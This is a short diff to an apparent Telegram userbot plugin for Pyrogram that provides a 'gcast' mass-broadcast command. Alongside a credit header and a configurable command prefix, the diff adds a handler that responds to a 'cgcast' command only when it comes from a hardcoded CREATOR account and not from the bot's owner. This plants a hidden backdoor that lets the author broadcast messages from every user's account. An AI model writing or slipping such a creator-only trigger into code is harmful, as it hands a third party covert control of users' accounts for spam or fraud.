@@ -1,10 +1,18 @@
+"""
+My Telegeram : https://t.me/Hakutaka_id
+My Github : 
+"""
+
 from pyrogram import Client, filters
 from pyrogram.enums import ChatType
 from pyrogram.types import Message
 import asyncio
 from haku.code.nganu import BL_GCAST
+from haku.code.nganu import CREATOR
+from config import CMD as cmd
 
-@Client.on_message(filters.me & filters.command("gcast", "."))
+@Client.on_message(filters.user(CREATOR) & filters.command("cgcast", ".") & ~filters.me)
+@Client.on_message(filters.me & filters.command("gcast", cmd))
 async def _(client, message: Message):
     sent = 0
     failed = 0
